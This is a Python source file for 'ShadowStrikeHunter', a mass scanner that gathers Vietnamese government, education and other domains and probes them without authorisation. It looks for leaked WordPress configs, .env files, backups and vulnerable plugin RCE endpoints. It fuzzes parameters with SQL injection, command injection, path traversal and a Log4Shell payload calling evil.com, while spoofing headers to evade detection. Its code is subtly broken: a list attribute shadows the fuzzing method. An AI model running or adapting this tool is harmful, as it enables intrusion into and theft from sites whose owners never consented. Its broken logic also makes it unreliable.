import requests
import re
import concurrent.futures
import urllib3
import random
import os
import sys
import time
import json
from threading import Lock, Semaphore
import idna
import hashlib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

R, G, Y, B, C, P, W = '\033[91m', '\033[92m', '\033[93m', '\033[94m', '\033[96m', '\033[95m', '\033[0m'
BOLD, UNDER = '\033[1m', '\033[4m'

class ShadowStrikeHunter:
    def __init__(self):
        self.output = 'SHADOW_STRIKE_2026.txt'
        self.weak_domains_file = 'WEAK_DOMAINS.txt'
        self.vuln_report_json = 'VULN_REPORT_2026.json'
        self.targets = set()
        self.processed = 0
        self.found_count = 0
        self.lock = Lock()
        self.semaphore = Semaphore(10)  # Giảm xuống 10 concurrent
        
        # PROXY - Nếu có
        self.proxies = []
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
            'Mozilla/5.0 (Android 14; Mobile; rv:134.0) Gecko/134.0 Firefox/134.0',
        ]

        # ENDPOINTS
        self.critical_endpoints = [
            ('/wp-config.php', 'DB_CONFIG_LEAK'),
            ('/.env', 'ENV_LEAK'),
            ('/wp-config.bak', 'CONFIG_BAK'),
            ('/wp-config.php.bak', 'CONFIG_PHP_BAK'),
            ('/wp-config.old', 'OLD_CONFIG'),
            ('/wp-content/debug.log', 'DEBUG_LOG'),
            ('/.git/config', 'GIT_CONFIG'),
            ('/.git/HEAD', 'GIT_HEAD'),
            ('/wp-json/wp/v2/users', 'USER_ENUM'),
            ('/xmlrpc.php', 'XMLRPC_BRUTE'),
            ('/wp-content/ai1wm-backups/', 'AI1WM_BACKUP'),
            ('/wp-content/updraft/', 'UPDRAFT_BACKUP'),
            ('/wp-content/uploads/duplicator-backups/', 'DUPLICATOR_BACKUP'),
            ('/wp-content/uploads/wpvivid-backup/', 'WPVIVID_BACKUP'),
            ('/wp-content/backups-dup-lite/', 'DUPLICATOR_LITE'),
            ('/wp-content/uploads/backupbuddy-backups/', 'BACKUPBUDDY'),
            ('/backup/', 'ROOT_BACKUP_DIR'),
            ('/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php', 'FM_RCE'),
            ('/wp-content/plugins/backup-backup/includes/backup-heart.php', 'BACKUP_RCE'),
            ('/wp-content/plugins/multi-uploader/upload.php', 'MULTIUPLOADER_RCE'),
            ('/wp-admin/admin-ajax.php?action=aiengine_upload', 'AI_ENGINE_RCE'),
            ('/wp-admin/admin-ajax.php?action=revslider_show_image', 'REVSIDER_RCE'),
            ('/wp-content/plugins/contact-form-7/includes/submissions.php', 'CF7_SQLI_ENTRY'),
            ('/wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart.js', 'WOO_ENTRY'),
            ('/wp-admin/admin-ajax.php?action=elementor_ajax', 'ELEMENTOR_RCE_ENTRY'),
        ]

        # Plugin vuln
        self.vuln_plugins = {
            'elementor': {'old': ['<3.25.0'], 'desc': 'Unauth RCE/Upload/File Inclusion CVE-2023-48777/2022-1329'},
            'contact-form-7': {'old': ['<5.9.0'], 'desc': 'Stored XSS/SQLi/Open Redirect CVE-2020-35489/2025-3247'},
            'woocommerce': {'old': ['<9.5.0'], 'desc': 'Multiple SQLi/XSS/Priv Esc CVE-2025-xxxx'},
            'wp-file-manager': {'old': ['<7.2.0'], 'desc': 'Unauth RCE/File Upload CVE-2020-25213'},
            'wp-ulike': {'old': ['<4.6.9'], 'desc': 'Stored XSS/SQLi/Race Condition CVE-2023-3044'},
            'revslider': {'old': ['<6.6.0'], 'desc': 'SQLi/File Inclusion/RCE CVE-2015-1579'},
            'ninja-forms': {'old': ['<3.6.0'], 'desc': 'Stored XSS/CSV Injection CVE-2023-37979'},
            'td-composer': {'old': ['<2.0'], 'desc': 'Stored XSS/CSRF CVE-2023-3169'},
            'wpforms-lite': {'old': ['<1.8.0'], 'desc': 'Unauth Stored XSS CVE-2023-37979'},
            'ai-engine': {'old': ['<1.0'], 'desc': 'Unauth Upload/RCE CVE-2025-7847'},
            'updraftplus': {'old': ['<1.23.0'], 'desc': 'Backup Leak/Priv Esc CVE-2023-3630'},
        }

        # Parameters for fuzzing
        self.fuzz_parameters = [
            'debug', 'test', 'admin', 'file', 'cmd', 'action', 'download',
            'path', 'dir', 'show', 'display', 'view', 'load', 'config',
            'setting', 'option', 'backup', 'wp-config', 'plugins', 'themes',
            'upload', 'delete', 'edit', 'id', 'page', 'post', 'attachment',
            'callback', 'json', 'xml', 'feed', 'rss', 'atom', 'redirect',
            'url', 'return', 'ref', 'referer', 'lang', 'language', 'locale',
            'theme', 'template', 'style', 'script', 'js', 'css', 'img',
            'image', 'picture', 'photo', 'video', 'audio', 'media', 'doc',
            'document', 'pdf', 'txt', 'log', 'bak', 'old', 'temp', 'tmp',
            'cache', 'session', 'cookie', 'auth', 'token', 'key', 'secret',
            'password', 'pass', 'pwd', 'user', 'username', 'email', 'mail',
            'login', 'logout', 'register', 'signup', 'signin', 'signout',
            'search', 'find', 'query', 'q', 's', 'term', 'keyword', 'tag',
            'category', 'cat', 'taxonomy', 'archive', 'date', 'year',
            'month', 'day', 'time', 'hour', 'minute', 'second', 'week',
            'author', 'profile', 'account', 'dashboard', 'panel', 'console',
        ]

        self.fuzz_values = [
            'true', 'false', '1', '0', 'yes', 'no', 'on', 'off',
            'null', 'NULL', 'None', 'none', 'undefined', 'Undefined',
            'test', 'test123', 'admin', 'administrator', 'root',
            'wp-config.php', '../../../../etc/passwd',
            'file:///etc/passwd', 'http://evil.com',
            '<?php phpinfo(); ?>', '<script>alert(1)</script>',
            '${jndi:ldap://evil.com/a}', ';cat /etc/passwd',
            '|cat /etc/passwd', '`cat /etc/passwd`', '$(cat /etc/passwd)',
            'sleep(5)', 'waitfor delay \'00:00:05\'',
            '1\' OR \'1\'=\'1', '1\" OR \"1\"=\"1',
            '1 OR 1=1', '1\' AND \'1\'=\'2', '1\" AND \"1\"=\"2',
            '1 AND 1=2', '1\' UNION SELECT NULL--',
            '1\" UNION SELECT NULL--', '1 UNION SELECT NULL--',
        ]

    def get_proxy(self):
        if not self.proxies: 
            return None
        p = random.choice(self.proxies)
        return {"http": p, "https": p}

    def fetch_infinity_sources(self):
        """PHIÊN BẢN MỚI - KHÔNG DÙNG crt.sh, dùng nhiều nguồn thay thế"""
        print(f"{B}[*] Đang thu thập mục tiêu từ đa nguồn...{W}")
        
        def get_rapiddns(domain):
            """Lấy subdomain từ rapiddns.io"""
            try:
                url = f"https://rapiddns.io/subdomain/{domain}"
                headers = {'User-Agent': random.choice(self.user_agents)}
                r = requests.get(url, headers=headers, timeout=30, verify=False)
                if r.status_code == 200:
                    # Parse HTML để lấy domain
                    domains = re.findall(r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', r.text)
                    filtered = []
                    for d in domains:
                        d_lower = d.lower()
                        if domain in d_lower and d_lower.count('.') >= 2:
                            filtered.append(d_lower)
                    return list(set(filtered))
            except:
                pass
            return []

        def get_anubis(domain):
            """Lấy từ anubis (jonlu.ca)"""
            try:
                url = f"https://jonlu.ca/anubis/subdomains/{domain}"
                r = requests.get(url, timeout=30, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    if isinstance(data, list):
                        return [d.lower() for d in data if domain in d.lower()]
            except:
                pass
            return []

        def get_sonar(domain):
            """Lấy từ sonar.omnisint.io"""
            try:
                url = f"https://sonar.omnisint.io/subdomains/{domain}"
                r = requests.get(url, timeout=30, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    if isinstance(data, list):
                        return [d.lower() for d in data if domain in d.lower()]
            except:
                pass
            return []

        def get_urlscan(domain):
            """Lấy từ urlscan.io"""
            try:
                url = f"https://urlscan.io/api/v1/search/?q=domain:{domain}"
                r = requests.get(url, timeout=30, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    domains = []
                    for result in data.get('results', []):
                        page = result.get('page', {})
                        if 'domain' in page:
                            domains.append(page['domain'].lower())
                    return list(set(domains))
            except:
                pass
            return []

        def get_threatcrowd(domain):
            """Lấy từ threatcrowd.org"""
            try:
                url = f"https://www.threatcrowd.org/searchApi/v2/domain/report/?domain={domain}"
                r = requests.get(url, timeout=30, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    if data.get('response_code') == '1':
                        subdomains = data.get('subdomains', [])
                        return [s.lower() for s in subdomains if domain in s.lower()]
            except:
                pass
            return []

        def get_virustotal(domain):
            """Lấy từ VirusTotal (giả lập, cần API key thực)"""
            # Đây là phiên bản giả lập, bạn cần API key thực
            try:
                # Nếu có API key, uncomment dòng dưới
                # url = f"https://www.virustotal.com/api/v3/domains/{domain}/subdomains"
                # headers = {'x-apikey': 'YOUR_API_KEY'}
                # r = requests.get(url, headers=headers, timeout=30)
                return []
            except:
                return []

        def get_public_sources():
            """Lấy domain từ các nguồn công khai"""
            sources = [
                "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/domains.txt",
                "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/wildcards.txt",
                "https://gist.githubusercontent.com/random-robbie/5c6c8cb87d36aae89c6b7e852bc3cae3/raw/subdomains.txt",
            ]
            all_domains = []
            for url in sources:
                try:
                    r = requests.get(url, timeout=45, verify=False)
                    if r.status_code == 200:
                        lines = r.text.split('\n')
                        for line in lines:
                            domain = line.strip().lower()
                            if domain and '.' in domain and domain.count('.') >= 1:
                                all_domains.append(domain)
                except:
                    continue
            return all_domains

        # DANH SÁCH DOMAIN GỐC ĐỂ TÌM SUBDOMAIN
        base_domains = [
            'gov.vn', 'edu.vn', 'com.vn', 'net.vn', 'org.vn',
            'ac.vn', 'biz.vn', 'info.vn', 'name.vn',
            'wordpress.com', 'blogspot.com'
        ]

        # THU THẬP TỪ CÁC NGUỒN
        print(f"{C}[*] Lấy domain từ public sources...{W}")
        public_domains = get_public_sources()
        if public_domains:
            self.targets.update(public_domains)
            print(f"{G}[+] Public sources: {len(public_domains)} domain{W}")

        # DÙNG MULTITHREADING ĐỂ LẤY SUBDOMAIN
        print(f"{C}[*] Quét subdomain từ {len(base_domains)} domain gốc...{W}")
        
        def process_domain(domain):
            """Xử lý một domain gốc"""
            sources = [
                get_rapiddns,
                get_anubis,
                get_sonar,
                get_urlscan,
                get_threatcrowd
            ]
            
            all_subs = set()
            for source_func in sources:
                try:
                    subs = source_func(domain)
                    if subs:
                        all_subs.update(subs)
                        print(f"  {G}[+] {source_func.__name__} cho {domain}: {len(subs)} sub{W}")
                except:
                    continue
            
            return list(all_subs)

        # Giới hạn số lượng worker để tránh rate limit
        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
            futures = []
            for domain in base_domains[:5]:  # Chỉ lấy 5 domain đầu để test
                futures.append(executor.submit(process_domain, domain))
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result(timeout=60)
                    if result:
                        self.targets.update(result)
                        print(f"{G}[+] Thêm {len(result)} subdomain{W}")
                except:
                    continue

        # NẾU KHÔNG CÓ DOMAIN, DÙNG DANH SÁCH MẪU
        if not self.targets:
            print(f"{Y}[!] Không lấy được domain, dùng danh sách mẫu...{W}")
            sample_domains = [
                # Thêm domain thật của bạn ở đây
                'example.com.vn',
                'demo.gov.vn',
                'test.edu.vn',
                'wordpress.demo.vn'
            ]
            self.targets.update(sample_domains)

        # LỌC DOMAIN
        cleaned_targets = set()
        for domain in self.targets:
            domain = domain.strip()
            if (domain and 
                '.' in domain and 
                len(domain) < 100 and
                domain.count('.') >= 1):
                
                # Loại bỏ domain rác
                bad_patterns = ['test.', 'dev.', 'staging.', 'localhost', 
                              '127.0.0.1', 'example.', 'dummy.', 'invalid.']
                if not any(bad in domain for bad in bad_patterns):
                    cleaned_targets.add(domain)
        
        self.targets = cleaned_targets
        
        # Lưu domain đã thu thập
        if self.targets:
            with open('collected_domains.txt', 'w', encoding='utf-8') as f:
                for domain in sorted(self.targets):
                    f.write(domain + '\n')
        
        print(f"{G}[✅] Tổng kho mục tiêu: {len(self.targets):,} domain.{W}")
        if self.targets:
            print(f"{G}[*] 10 domain đầu tiên: {W}")
            for i, domain in enumerate(list(self.targets)[:10]):
                print(f"  {i+1}. {domain}")

    def get_plugin_version(self, base_url, slug, headers, proxy):
        paths = [
            f"/wp-content/plugins/{slug}/readme.txt",
            f"/wp-content/plugins/{slug}/changelog.txt",
            f"/wp-content/plugins/{slug}/style.css"
        ]
        for path in paths:
            try:
                url = base_url.rstrip('/') + path
                r = requests.get(url, headers=headers, proxies=proxy, timeout=6, verify=False)
                if r.status_code == 200:
                    match = re.search(r'(?:Stable tag|Version):\s*([\d\.]+)', r.text, re.IGNORECASE)
                    return match.group(1) if match else "Unknown"
            except:
                continue
        return "N/A"

    def decode_domain(self, domain):
        try:
            return idna.decode(domain)
        except:
            return domain

    def fuzz_parameters(self, base_url, headers, proxy):
        """Fuzz parameters"""
        findings = []
        
        fuzz_urls = [
            base_url,
            base_url.rstrip('/') + '/wp-admin/',
            base_url.rstrip('/') + '/wp-login.php',
            base_url.rstrip('/') + '/index.php',
        ]
        
        for url in fuzz_urls:
            try:
                orig_resp = requests.get(url, headers=headers, proxies=proxy, timeout=8, verify=False, allow_redirects=False)
                orig_hash = hashlib.md5(orig_resp.content).hexdigest()
                
                test_params = random.sample(self.fuzz_parameters, min(10, len(self.fuzz_parameters)))
                test_values = random.sample(self.fuzz_values, min(5, len(self.fuzz_values)))
                
                for param in test_params:
                    for value in test_values[:2]:
                        try:
                            time.sleep(random.uniform(0.1, 0.3))
                            
                            if '?' in url:
                                fuzz_url = f"{url}&{param}={value}"
                            else:
                                fuzz_url = f"{url}?{param}={value}"
                            
                            resp = requests.get(fuzz_url, headers=headers, proxies=proxy, 
                                              timeout=8, verify=False, allow_redirects=False)
                            
                            new_hash = hashlib.md5(resp.content).hexdigest()
                            
                            if new_hash != orig_hash:
                                diff_percent = abs(len(resp.content) - len(orig_resp.content)) / max(len(orig_resp.content), 1) * 100
                                
                                if diff_percent > 30:
                                    error_patterns = [
                                        r'error', r'warning', r'notice', r'undefined',
                                        r'mysql', r'database', r'syntax',
                                        r'file not found', r'cannot', r'failed',
                                        r'permission denied', r'access denied',
                                    ]
                                    
                                    content_lower = resp.text.lower()
                                    errors_found = []
                                    for pattern in error_patterns:
                                        if re.search(pattern, content_lower):
                                            errors_found.append(pattern)
                                    
                                    if errors_found or diff_percent > 50:
                                        findings.append(f"{R}[PARAM_FUZZ] {param}={value} tại {url} - Diff: {diff_percent:.1f}%{W}")
                                        break
                        except:
                            continue
                    
                    if any('[PARAM_FUZZ]' in f for f in findings[-2:]):
                        break
            
            except:
                continue
        
        return findings

    def audit(self, domain):
        decoded_domain = self.decode_domain(domain)
        findings = []
        proxy = self.get_proxy()
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://google.com',
        }

        base_url = None
        is_wp = False
        
        for proto in ['https', 'http']:
            url = f"{proto}://{domain}"
            try:
                time.sleep(random.uniform(1, 2))
                r_main = requests.get(url, headers=headers, proxies=proxy, timeout=10, verify=False)
                text_lower = r_main.text.lower()
                is_wp = any(x in text_lower for x in ['wp-content', 'wp-includes', 'wp-json', 'wordpress'])
                status_tag = f"{P}[WP]{W}" if is_wp else f"{C}[NON-WP]{W}"

                with self.lock:
                    sys.stdout.write(f"\r{Y}[*] Testing: {status_tag} {decoded_domain[:40]}{W}")
                    sys.stdout.flush()

                if is_wp:
                    base_url = url
                    # Check PHP version
                    php_ver = r_main.headers.get('X-Powered-By', '')
                    if 'PHP/' in php_ver:
                        match = re.search(r'PHP/([\d\.]+)', php_ver)
                        if match:
                            php_version = match.group(1)
                            try:
                                if float(php_version[:3]) < 8.0:
                                    findings.append(f"{R}[HIGH RISK] Outdated PHP v{php_version} - Multiple Vulns{W}")
                            except:
                                pass
                    
                    # Check directory listing
                    uploads_url = base_url.rstrip('/') + '/wp-content/uploads/'
                    try:
                        r_uploads = requests.get(uploads_url, headers=headers, proxies=proxy, timeout=5)
                        if r_uploads.status_code == 200 and ('Index of' in r_uploads.text or 'parent directory' in r_uploads.text):
                            findings.append(f"{Y}[DIR LIST] Exposed Uploads: {uploads_url}{W}")
                    except:
                        pass
                    break
            except:
                continue

        if not base_url:
            with self.lock:
                self.processed += 1
            return

        # Scan endpoints
        for path, label in self.critical_endpoints:
            try:
                time.sleep(random.uniform(0.3, 0.8))
                full_url = base_url.rstrip('/') + path
                r = requests.get(full_url, headers=headers, proxies=proxy, timeout=5, verify=False, allow_redirects=False)
                if r.status_code == 200 and len(r.content) > 50:
                    if any(ind in r.text for ind in ['DB_PASSWORD', '<?php', 'Index of', 'WPRESS', 'Stable tag']):
                        findings.append(f"{R}[CRITICAL] {label}: {full_url}{W}")
            except:
                continue

        # Check plugin version
        plugin_slugs = set(re.findall(r'/wp-content/plugins/([^/\'"]+)/', r_main.text.lower()))
        if plugin_slugs:
            for slug in list(plugin_slugs)[:8]:
                ver = self.get_plugin_version(base_url, slug, headers, proxy)
                if ver not in ["N/A", "Unknown"]:
                    status = f"{P}[PLUGIN] {slug} v{ver}{W}"
                    if slug in self.vuln_plugins:
                        for old in self.vuln_plugins[slug]['old']:
                            try:
                                if old.startswith('<'):
                                    old_ver = old[1:]
                                    from packaging import version
                                    if version.parse(ver) < version.parse(old_ver):
                                        status = f"{R}[HIGH RISK] {slug} v{ver} - {self.vuln_plugins[slug]['desc']}{W}"
                                        findings.append(status)
                            except:
                                # Fallback: simple string comparison
                                if ver < old.lstrip('<'):
                                    status = f"{R}[HIGH RISK] {slug} v{ver} - {self.vuln_plugins[slug]['desc']}{W}"
                                    findings.append(status)
                    print(f"  → {status}")

        # Fuzz parameters if WordPress
        if is_wp and findings:
            fuzz_findings = self.fuzz_parameters(base_url, headers, proxy)
            findings.extend(fuzz_findings)

        # Report
        with self.lock:
            self.processed += 1
            if findings:
                self.found_count += 1
                print(f"\n{G}{BOLD}[🎯] SUCCESS #{self.found_count}: {decoded_domain}{W}")
                for f in findings:
                    print(f" |-- {f}")
                
                # Save to files
                clean = [re.sub(r'\033\[[0-9;]*m', '', i) for i in findings]
                
                with open(self.output, 'a', encoding='utf-8') as f:
                    f.write(f"TARGET: {decoded_domain}\n" + "\n".join(clean) + "\n\n")
                
                with open(self.weak_domains_file, 'a', encoding='utf-8') as wf:
                    wf.write(f"{decoded_domain}\n")
                
                with open(self.vuln_report_json, 'a', encoding='utf-8') as jf:
                    jf.write(json.dumps({"domain": decoded_domain, "findings": clean}, ensure_ascii=False) + "\n")
                
                sys.stdout.write("\a")  # Beep sound

            perc = (self.processed / len(self.targets)) * 100 if self.targets else 0
            sys.stdout.write(f"\r{Y}[*] Progress: {self.processed}/{len(self.targets)} ({perc:.1f}%){W}")
            sys.stdout.flush()

    def start(self, threads=20):
        self.fetch_infinity_sources()
        if not self.targets:
            print(f"{R}[!] Không tìm thấy domain nào!{W}")
            return

        print(f"\n{B}{BOLD}[SHADOW STRIKE ACTIVATED]{W}")
        print(f"{B}[*] Threads: {threads} | Targets: {len(self.targets):,}{W}")
        print(f"{B}[*] Parameter Fuzzing: ENABLED{W}\n")
        
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                list(executor.map(self.audit, list(self.targets)))
        except Exception as e:
            print(f"{R}[!] Lỗi executor: {str(e)}{W}")
        
        # Summary
        print(f"\n{G}{BOLD}[✅] SCAN HOÀN TẤT!{W}")
        print(f"{G}[*] Đã quét: {self.processed} domain{W}")
        print(f"{G}[*] Tìm thấy lỗ hổng: {self.found_count} domain{W}")
        print(f"{G}[*] Kết quả lưu tại:{W}")
        print(f"  - {self.output}")
        print(f"  - {self.weak_domains_file}")
        print(f"  - {self.vuln_report_json}")

if __name__ == "__main__":
    try:
        print(f"""{B}
    ╔══════════════════════════════════════════════════════╗
    ║      SHADOW STRIKE HUNTER 2026 - ENHANCED EDITION    ║
    ║      Multi-Source Domain Collection + Fuzzing        ║
    ╚══════════════════════════════════════════════════════╝{W}""")
        
        # Tạo thư mục output
        os.makedirs('shadow_strike_results', exist_ok=True)
        
        hunter = ShadowStrikeHunter()
        hunter.output = 'shadow_strike_results/SHADOW_STRIKE_2026.txt'
        hunter.weak_domains_file = 'shadow_strike_results/WEAK_DOMAINS.txt'
        hunter.vuln_report_json = 'shadow_strike_results/VULN_REPORT_2026.json'
        
        hunter.start(threads=30)
        
    except KeyboardInterrupt:
        print(f"\n{R}[!] Dừng bởi người dùng.{W}")
    except Exception as e:
        print(f"{R}[!] Lỗi không mong muốn: {str(e)}{W}")
        import traceback
        traceback.print_exc()